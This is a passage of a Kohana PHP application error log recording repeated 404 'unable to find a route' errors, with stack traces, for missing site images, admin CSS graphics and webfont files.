#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/box_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/box_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/lightbox_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/lightbox_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/edition_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/edition_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/box_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/box_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/arrow_white.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/arrow_white.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/box_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/box_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/edit_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/edit_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:21 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/buy_now_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:21 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/buy_now_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:22 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bg_layout_white1.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:22 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bg_layout_white1.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/trams.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/trams.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/green_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/green_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/menu_spliter.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/menu_spliter.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/tool_tip_bottom.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/tool_tip_bottom.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bl_butt_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bl_butt_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bl_butt_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bl_butt_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/menu_corner.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/menu_corner.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bl_butt_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bl_butt_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/green_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/green_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/mid_divider.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/mid_divider.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/tooltip_top.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/tooltip_top.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/green_round.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/green_round.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/side_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/side_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/spliter_bar.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/spliter_bar.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/green_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/green_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/tooltip_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/tooltip_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/lightbox_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/lightbox_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/lightbox_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/lightbox_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/seller_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/seller_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pagination_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pagination_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/banner_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/banner_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/edit_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/edit_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/timer_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/timer_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/side_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/side_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/inner_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/inner_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/inner_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/inner_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/inner_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/inner_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/editr_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/editr_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:55 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/menu_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:55 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/menu_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/edit_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/edit_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:58 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/menu_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:58 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/menu_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:01:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pay_shad2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:01:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pay_shad2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pop_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pop_mid.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pop_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pop_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bott_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/bott_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pop_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pop_lft.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/slice.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/slice.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/edition_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/edition_middle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:07 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/expared.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:07 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/expared.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/linkedin.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/linkedin.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:09 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: media/img/scrollable/arrow/vert_large.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:09 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: media/img/scrollable/arrow/vert_large.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/backgrounds/respNavBg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/backgrounds/respNavBg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/ui/usualButtons.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/ui/usualButtons.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold_Italic-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold_Italic-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold_Italic-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold_Italic-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold_Italic-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold_Italic-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light_Italic-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light_Italic-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold_Italic-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold_Italic-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:55 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light_Italic-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:55 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light_Italic-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:58 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light_Italic-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:58 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light_Italic-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:02:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Regular-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:02:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Regular-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Regular-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Regular-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light_Italic-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light_Italic-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Regular-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Regular-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:05 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: images/indicator.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:05 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: images/indicator.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
